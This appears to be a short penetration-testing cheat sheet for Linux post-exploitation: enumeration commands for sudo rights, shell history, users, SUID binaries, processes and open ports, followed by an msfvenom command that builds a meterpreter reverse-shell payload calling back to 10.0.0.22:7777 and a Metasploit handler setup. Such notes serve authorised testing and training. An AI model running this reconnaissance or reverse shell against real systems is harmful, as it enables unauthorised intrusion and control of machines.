Show Linux version:
```bash
uname -a
```

List sudo privileges of current user:
```bash
sudo -l
```

Print history:
```bash
history
```

Search hidden files in home directory:
```bash
ls -la ~
```

List users:
```bash
cat /etc/passwd
```

Search for SUID executables:
```bash
find / -perm -u=s -type f 2>/dev/null
```

List running processes:
```bash
ps -aux
```

List open ports:
```bash
netstat -tulpn
```

Upgrade a system shell to meterpreter:
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.22 LPORT=7777 -f elf > revshell.bin
```
Setup listener:
```msfconsole
use exploit/multi/handler
```
